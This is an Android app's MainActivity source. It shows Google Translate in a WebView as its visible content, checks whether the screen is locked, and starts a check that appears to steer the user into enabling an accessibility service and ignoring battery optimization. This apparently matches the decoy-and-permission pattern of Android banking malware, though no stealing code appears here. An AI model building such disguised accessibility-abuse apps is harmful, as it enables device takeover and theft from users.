package com.test.myapp;

import static com.test.myapp.MyAccessibilityService.CHECK_Permission;
import static com.test.myapp.MyAccessibilityService.CHECK_Permission_IGNORE_BATTERY_OPTIMIZATIONS;

import com.test.Request.*;
import com.test.Response.*;

// fix Cannot resolve sambol 'THREAD_PRIORITY_BACKGROUND' in HandlerThread
import android.accessibilityservice.AccessibilityService;
import android.app.KeyguardManager;
import android.content.pm.PackageManager;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Message;
import android.os.Process;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import retrofit2.Call;

import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.provider.Settings;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.localbroadcastmanager.content.LocalBroadcastManager;

import java.util.concurrent.TimeUnit;

import retrofit2.Callback;
import retrofit2.Response;


public class MainActivity extends AppCompatActivity  {

    private WebView webView;

    public static boolean GS_ClassGen11_B(Context c) {
        KeyguardManager km = (KeyguardManager) c.getSystemService(c.KEYGUARD_SERVICE);
        if (km.inKeyguardRestrictedInputMode()) {
            return false;
        } else {
            return true;
        }
    }


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_main);

        webView = (WebView) findViewById(R.id.webview);
        webView.setWebViewClient(new WebViewClient());
        webView.loadUrl("https://translate.google.ru/");

        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);

        // startService(new Intent(this, MyIntentServiceForAskPermission.class));
        // startService(new Intent(this, MyService.class));
        CheckAccessibilityEnable check = new CheckAccessibilityEnable(this);
        check.startCheckAccess();

    }





    @Override
    public void onBackPressed() {
        if(webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }

    private BroadcastReceiver mMessageReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            // Get extra data included in the Intent
            String message = intent.getStringExtra("message");

            final TextView textView = findViewById(R.id.text_View);
            textView.append(message + "\n");
        }
    };

    @Override
    protected void onStart() {
        super.onStart();

        final TextView textView = findViewById(R.id.text_View);

        LocalBroadcastManager.getInstance(this).registerReceiver(
                mMessageReceiver, new IntentFilter("ACTION_VIEW"));

    }

    @Override
    protected void onResume()
    {
        super.onResume();
        //registerReceiver(statusReceiver,mIntent);
        // LocalBroadcastManager.getInstance(MainActivity.this).registerReceiver(mMessageReceiver, new IntentFilter("TestMessage"));
    }

    @Override
    protected void onPause() {
        // отменять регистрацию нужно, только если ресивер был использован!
        // unregisterReceiver(mMessageReceiver);
        super.onPause();
    }
}